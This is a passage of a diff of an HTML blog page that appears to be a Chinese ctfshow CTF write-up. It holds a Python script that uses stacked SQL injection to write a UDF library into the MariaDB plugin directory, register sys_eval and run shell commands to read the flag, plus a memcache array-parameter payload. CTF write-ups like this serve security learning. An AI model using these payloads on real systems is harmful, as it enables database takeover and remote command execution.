+next_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'--+&amp;page=1&amp;limit=10"</span>
+rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>
+
+uaf_url<span class="token operator">=</span>base_url<span class="token operator">+</span><span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span><span class="token comment">#导入udf函数</span>
+r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>
+nn_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select sys_eval('cat /flag.*');--+&amp;page=1&amp;limit=10"</span>
+rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><ul>
+<li>题目环境</li>
+</ul>
+<p>sql语句</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;无
+$user &#x3D; $memcache-&gt;get($id);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">?id[]&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsswwcmbudj30p30cy75p.jpg" alt="image-20210725085601820"></p>
 
                 
             </div>
@@ -1359,13 +2649,13 @@ document.body.addEventListener('click', function(e) {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/07/10/4322.html">
+                <a href="/2021/07/10/723.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Java笔记">
+                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="ctfshow-反序列化">
                         
-                        <span class="card-title">Java笔记</span>
+                        <span class="card-title">ctfshow-反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1389,8 +2679,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/git/">
-                        <span class="chip bg-color">git</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
